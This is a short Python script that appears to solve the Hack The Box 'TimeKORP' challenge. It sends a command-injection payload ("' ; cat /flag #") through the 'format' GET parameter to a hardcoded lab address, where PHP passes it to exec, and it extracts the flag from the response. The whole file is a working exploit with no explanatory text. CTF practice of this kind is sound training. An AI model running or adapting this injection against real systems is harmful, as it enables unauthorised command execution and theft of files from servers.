#!/usr/bin/env python3
"""TimeKORP — OS command injection via GET format (PHP exec/date)."""
from __future__ import annotations

import argparse
import re
import sys
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"HTB\{[^}]+\}")
H1_RE = re.compile(r"(?s)<h1[^>]*>.*?</h1>")


def exploit(base: str, timeout: float = 20.0) -> str:
    payload = "' ; cat /flag #"
    url = base.rstrip("/") + "/?format=" + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", errors="replace")
    m = FLAG_RE.search(body)
    if not m:
        h1 = H1_RE.search(body)
        raise SystemExit(f"no flag in response; h1={h1.group(0) if h1 else 'n/a'}")
    return m.group(0)


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.82:30695")
    args = p.parse_args()
    flag = exploit(args.target)
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
